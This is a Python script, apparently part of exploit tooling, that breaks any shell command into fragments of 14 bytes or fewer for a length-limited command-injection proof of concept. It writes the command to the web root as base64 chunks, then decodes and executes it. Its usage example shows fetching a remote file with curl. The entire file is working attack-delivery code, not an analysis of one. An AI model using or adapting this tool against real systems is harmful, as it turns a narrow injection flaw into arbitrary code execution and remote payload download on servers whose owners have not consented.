#!/usr/bin/env python3
"""Plan a long shell command as a sequence of <=14-byte PoC commands.

The target command is base64-encoded, written to ``b`` in the current web-root
directory in small chunks, decoded to ``x``, and executed with ``sh < x``.
Base64 avoids shell quoting problems for spaces, quotes, backslashes, and
UTF-8. The plan is only a delivery mechanism; the caller still runs each step
through the PoC and checks the result.

Usage:
    python3 scripts/short_command_planner.py 'curl -fsSL https://example/x -o /tmp/p'
    python3 scripts/short_command_planner.py --max-bytes 14 --command 'id'
"""

from __future__ import annotations

import argparse
import base64
import sys


def plan(command: str, max_bytes: int = 14, script: str = "x", encoded: str = "b") -> list[str]:
    """Return PoC commands that write and execute ``command``.

    The commands must all fit in ``max_bytes`` UTF-8 bytes. The supported
    alphabet is arbitrary because the payload is base64-encoded; the command
    itself is never split on shell syntax boundaries.
    """
    if not command:
        raise ValueError("command must not be empty")
    if max_bytes < 13:
        raise ValueError("max_bytes must be at least 13")

    data = base64.b64encode(command.encode("utf-8")).decode("ascii")
    # first command: printf CHUNK>script (13 bytes with a 4-byte chunk)
    # later commands: printf CHUNK>>script (14 bytes with a 4-byte chunk)
    chunk_size = max(1, min(4, max_bytes - 10))
    commands: list[str] = []
    for index in range(0, len(data), chunk_size):
        chunk = data[index:index + chunk_size]
        if index == 0:
            commands.append(f"printf {chunk}>{encoded}")
        else:
            commands.append(f"printf {chunk}>>{encoded}")
    commands.append(f"base64 -d {encoded}>{script}")
    commands.append(f"sh < {script}")

    for cmd in commands:
        size = len(cmd.encode("utf-8"))
        if size > max_bytes:
            raise ValueError(f"planned command is {size} bytes (max {max_bytes}): {cmd!r}")
    return commands


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("command", nargs="?", help="full shell command to deliver")
    parser.add_argument("--max-bytes", type=int, default=14)
    parser.add_argument("--script", default="x")
    parser.add_argument("--encoded", default="b")
    args = parser.parse_args()

    command = args.command
    if command is None:
        command = sys.stdin.read()
    command = command.rstrip("\n")
    try:
        for step in plan(command, args.max_bytes, args.script, args.encoded):
            print(step)
    except ValueError as exc:
        print(f"ERROR: {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
